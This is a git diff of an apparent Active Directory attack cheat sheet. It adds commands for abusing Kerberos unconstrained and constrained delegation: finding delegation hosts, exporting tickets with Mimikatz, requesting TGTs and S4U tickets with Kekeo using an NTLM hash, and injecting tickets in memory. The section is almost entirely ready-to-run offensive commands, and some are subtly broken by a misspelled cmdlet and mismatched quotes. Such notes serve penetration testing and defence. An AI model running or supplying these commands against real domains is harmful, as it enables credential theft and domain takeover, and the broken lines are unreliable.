@@ -1,5 +1,5 @@
 # Active-Directory
-This Repository will contains various tools,scripts,commands used in Active Directory Enumeration and Exploitation
+This Repository will contains various tools,scripts and commands used in Active Directory Enumeration and Exploitation
 
 
 ## Domain Enumeration
@@ -107,5 +107,24 @@ Invoke-Userhunter -CheckAccess : To confirm admin access
 -     Get-ASRepHash -Username studentx -verbose
   
 ### Unconstrained Delegation
+  
+- Discover the computers having unconstrained Delegation (Require Access to the server having unconstrained delegation)
+-    Get-Netcomputer -Unconstrained 
+- Run mimikatz to check if any domain admin ticket is available 
+-    Invoke-Mimimkaz -command '"sekurlsa::tickets /export"'
+- The token can be reused
+-    Invoke-Mimikatz -command '"kerberos::ptt ticket.kirbi"'
+ 
+### Constrained Delegation
+- Enumerate Users and Computers with constrained Delegation (Requires Access to the server or user having constrained delegation)
+-     Get-DomainUser -TrustedtoAuth
+-     Get-DomainComputer -TrustedtoAuth
+- Using Kekeo to request for TGT
+-     tgt::ask /user:websvc /domain:abc.local /rc4:<ntlm hash of server having unconstrained delegation>
+- Using kekeo to request for TGS
+-     tgs::s4u  /tgt:tgt_ticket.kirbi /user:<target user> /service:<allowed_service>
+- Using Mimikatz to inject ticket in memory
+-     Invoke-Mimikatz -command '"kerberos::ptt ticket.kirbi'"
+  
   
 
